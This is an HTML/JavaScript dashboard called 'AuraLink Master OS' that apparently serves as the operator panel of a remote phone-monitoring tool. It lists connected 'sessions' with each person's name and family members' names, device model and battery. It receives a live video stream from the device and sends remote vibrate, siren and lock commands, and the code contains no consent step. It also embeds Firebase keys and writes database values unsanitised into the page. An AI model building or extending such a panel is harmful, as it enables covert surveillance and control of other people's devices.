<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>AuraLink Master OS v7.0</title>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #020617; color: #f8fafc; font-family: 'Inter', sans-serif; }
        .session-card { background: #0f172a; border: 1px solid #1e293b; transition: 0.3s; }
        .session-card:hover { border-color: #3b82f6; background: #1e293b; }
        .live-stream { aspect-ratio: 9/16; background: #000; border-radius: 20px; overflow: hidden; border: 2px solid #3b82f6; }
    </style>
</head>
<body class="flex h-screen overflow-hidden">

    <!-- Sidebar: Session List -->
    <aside class="w-80 border-r border-slate-800 p-6 flex flex-col">
        <h1 class="text-xl font-black text-blue-500 mb-8 tracking-tighter italic">AURALINK OS</h1>
        <div class="text-[10px] font-bold text-slate-500 uppercase mb-4">Active Handshakes</div>
        <div id="sessionList" class="flex-1 overflow-y-auto space-y-3">
            <!-- Sessions will appear here automatically -->
        </div>
    </aside>

    <!-- Main Content: Controls & Stream -->
    <main class="flex-1 p-8 grid grid-cols-12 gap-8 overflow-y-auto">
        <div class="col-span-4">
            <div class="live-stream shadow-2xl shadow-blue-900/20">
                <video id="adminVideo" autoplay playsinline class="w-full h-full"></video>
            </div>
            <button onclick="document.getElementById('adminVideo').requestFullscreen()" class="w-full mt-4 bg-slate-800 py-3 rounded-xl text-xs font-bold">FULL SCREEN VIEW</button>
        </div>

        <div class="col-span-8 space-y-6">
            <div class="grid grid-cols-2 gap-6">
                <div class="bg-slate-900 p-6 rounded-3xl border border-slate-800">
                    <h3 class="text-xs font-bold text-slate-500 uppercase mb-4">User Identity</h3>
                    <div class="space-y-2">
                        <p>Name: <b id="u-name" class="text-blue-400">--</b></p>
                        <p>Father: <b id="u-father" class="text-slate-300">--</b></p>
                        <p>Brother: <b id="u-brother" class="text-slate-300">--</b></p>
                    </div>
                </div>
                <div class="bg-slate-900 p-6 rounded-3xl border border-slate-800">
                    <h3 class="text-xs font-bold text-slate-500 uppercase mb-4">Device Stats</h3>
                    <div class="space-y-2">
                        <p>Model: <b id="u-model" class="text-slate-300">--</b></p>
                        <p>Battery: <b id="u-bat" class="text-green-500">--</b></p>
                        <p>Status: <b class="text-blue-500 animate-pulse">ENCRYPTED LIVE</b></p>
                    </div>
                </div>
            </div>

            <div class="bg-slate-900 p-6 rounded-3xl border border-slate-800">
                <h3 class="text-xs font-bold text-slate-500 uppercase mb-4">Remote Command Center</h3>
                <div class="grid grid-cols-4 gap-4">
                    <button onclick="sendRemoteCmd('vibrate')" class="bg-white/5 p-4 rounded-2xl hover:bg-blue-600 transition">Vibrate</button>
                    <button onclick="sendRemoteCmd('beep')" class="bg-white/5 p-4 rounded-2xl hover:bg-blue-600 transition">Siren</button>
                    <button onclick="sendRemoteCmd('lock')" class="bg-red-900/20 p-4 rounded-2xl text-red-500">Lock</button>
                    <button onclick="location.reload()" class="bg-white/5 p-4 rounded-2xl">Refresh</button>
                </div>
            </div>
        </div>
    </main>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCvsSmO56lQ37M43Zm-zSY7pduzqgR-Ka4",
            authDomain: "auralink-2026.firebaseapp.com",
            projectId: "auralink-2026",
            databaseURL: "https://auralink-2026-default-rtdb.firebaseio.com",
            appId: "1:801004659604:web:9fbcf2b2d88696d9afa581"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const peer = new Peer("AURALINK_MASTER_ADMIN");

        let activeSessionId = null;

        // Auto-load Sessions
        db.ref('sessions').on('value', (snap) => {
            const list = document.getElementById('sessionList');
            list.innerHTML = "";
            snap.forEach((child) => {
                const data = child.val();
                const card = document.createElement('div');
                card.className = "session-card p-4 rounded-2xl cursor-pointer";
                card.innerHTML = `<div class='text-sm font-bold'>${data.name}</div><div class='text-[10px] text-slate-500'>${data.model}</div>`;
                card.onclick = () => loadSession(child.key, data);
                list.appendChild(card);
            });
        });

        function loadSession(id, data) {
            activeSessionId = id;
            document.getElementById('u-name').innerText = data.name;
            document.getElementById('u-father').innerText = data.father;
            document.getElementById('u-brother').innerText = data.brother;
            document.getElementById('u-model').innerText = data.model;
            document.getElementById('u-bat').innerText = data.battery;
        }

        peer.on('call', (call) => {
            call.answer();
            call.on('stream', (stream) => {
                document.getElementById('adminVideo').srcObject = stream;
            });
        });

        function sendRemoteCmd(act) {
            if(!activeSessionId) return alert("Select a user first!");
            db.ref('commands/' + activeSessionId).set({ action: act, time: Date.now() });
        }
    </script>
</body>
</html>
